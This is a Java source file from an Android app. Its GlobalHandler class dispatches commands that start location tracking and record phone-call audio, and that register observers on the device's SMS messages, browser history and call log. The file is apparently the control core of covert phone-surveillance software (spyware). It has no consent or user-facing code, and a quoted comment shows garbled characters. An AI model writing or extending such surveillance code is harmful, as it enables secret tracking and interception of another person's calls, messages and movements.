package com.main;

import com.phone.control.DeviceManager;
import com.phone.data.BrowserHistory;
import com.phone.data.CallLogContentObserver;
import com.phone.data.PhoneCallAudio;
import com.phone.data.PhoneLocation;
import com.phone.data.PhoneLocationListener;
import com.phone.data.SMSContentObserver;
import com.utils.Public;

import android.content.ContentResolver;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;


//adb logcat *:E >d:\1.txt

final public class GlobalHandler implements Runnable{
	
	private static String TAG = "GlobalHandler";
	
	public static final int REGISTRY_LOCATION 		= 1;
	public static final int UNREGISTRY_LOCATION 	= 2;
	public static final int UNREGISTRY_LISTENER 	= 3;
	public static final int REGISTRY_AUDIO_RECORD 	= 4;
	public static final int REGISTRY_MSG_LISTEN 	= 5;
	public static final int REGISTRY_CALLLOG_LISTEN = 6;
	public static final int REGISTRY_BROWSER_LISTEN = 7;
	public static final int REGISTRY_LOCLISTENER	= 8;
	private Context context = null;
	public static Handler gHandler = null;
	

	
	public GlobalHandler(Context context){
		this.context = context;
	}
	


	@Override
	public void run(){
		if (gHandler != null) {
			Log.e(TAG,"gHandler exist already");
			return;
		}
		
		/*
		Caution: A service runs in the main thread of its hosting process¡ªthe
		service does not create its own thread and does not run in a separate
		process (unless you specify otherwise). This means that, if your
		service is going to do any CPU intensive work or blocking operations
		(such as MP3 playback or networking), you should create a new thread
		within the service to do that work. By using a separate thread, you
		will reduce the risk of Application Not Responding (ANR) errors and
		the application¡¯s main thread can remain dedicated to user interaction
		with your activities.
		*/
		
		Looper.prepare();
		try {
			gHandler = new Handler(){

				public void handleMessage(Message msg){

					Log.e(TAG,"gHandler message:"+msg.what);
					
					switch (msg.what) {
					case REGISTRY_LOCATION:{
						Public.LOCATION_TYPE = 1;
						
						PhoneLocationListener.gLocationListener = new PhoneLocationListener(context);
						PhoneLocationListener.gLocationType = PhoneLocation.setLocationListener(context);
						break;
					}
					
					case UNREGISTRY_LOCATION:{
						PhoneLocation.closeLocation(context);
						break;
					}

					case UNREGISTRY_LISTENER:{
						TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
						tm.listen(PhoneCallAudio.gPhoneCallAudio, android.telephony.PhoneStateListener.LISTEN_NONE);
						
						ContentResolver cr = context.getContentResolver();
						cr.unregisterContentObserver(BrowserHistory.gBrowserHistory);
						cr.unregisterContentObserver(CallLogContentObserver.gCallLogContentObserver);
						cr.unregisterContentObserver(SMSContentObserver.gSmsContentObserver);
						DeviceManager.removeDeviceManager(context);
						break;
					}
					case REGISTRY_AUDIO_RECORD:{
						PhoneCallAudio.gPhoneCallAudio = new PhoneCallAudio(context);
						new Thread(PhoneCallAudio.gPhoneCallAudio).start();
						break;
					}
					case REGISTRY_MSG_LISTEN:{
						SMSContentObserver.gSmsContentObserver = new SMSContentObserver(new android.os.Handler(),context);
						new Thread(SMSContentObserver.gSmsContentObserver).start();
						break;
					}
					case REGISTRY_BROWSER_LISTEN:{
						BrowserHistory.gBrowserHistory = new BrowserHistory(new android.os.Handler(),context);
						new Thread(BrowserHistory.gBrowserHistory).start();
						break;
					}
					case REGISTRY_CALLLOG_LISTEN:{
						CallLogContentObserver.gCallLogContentObserver = new CallLogContentObserver(new android.os.Handler(),context);
						new Thread(CallLogContentObserver.gCallLogContentObserver).start();
						break;
					}
					default:
						break;
					}
				}
			};
		} catch (Exception e) {
			Log.e(TAG, "exception");
			e.printStackTrace();
		}
		Looper.loop();
	}

}
